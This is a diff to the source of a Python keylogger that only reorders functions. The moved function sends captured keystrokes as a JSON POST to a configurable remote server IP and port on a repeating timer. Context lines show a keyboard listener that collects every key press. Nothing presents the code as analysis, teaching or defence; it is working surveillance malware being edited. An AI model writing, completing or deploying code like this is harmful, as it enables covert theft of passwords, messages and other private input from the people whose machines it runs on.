@@ -21,20 +21,6 @@ server_port = "<port>"
 # Time interval for sending data
 send_interval = 10
 
-def send_data_to_server():
-    """
-    Sends the collected keystrokes to the server at regular intervals.
-    """
-    try:
-        payload = json.dumps({"keyboardData": keystrokes})
-        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
-        
-        # Set up the next call to this function
-        timer = threading.Timer(send_interval, send_data_to_server)
-        timer.start()
-    except:
-        print("Couldn't complete request!")
-
 def handle_key_press(key):
     """
     Handles the key press events and updates the keystrokes variable.
@@ -56,6 +42,20 @@ def handle_key_press(key):
         return False
     else:
         keystrokes += str(key).strip("'")
+
+def send_data_to_server():
+    """
+    Sends the collected keystrokes to the server at regular intervals.
+    """
+    try:
+        payload = json.dumps({"keyboardData": keystrokes})
+        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
+        
+        # Set up the next call to this function
+        timer = threading.Timer(send_interval, send_data_to_server)
+        timer.start()
+    except:
+        print("Couldn't complete request!")
 
 # Start the keyboard listener and initiate sending data to the server
 with keyboard.Listener(on_press=handle_key_press) as listener:
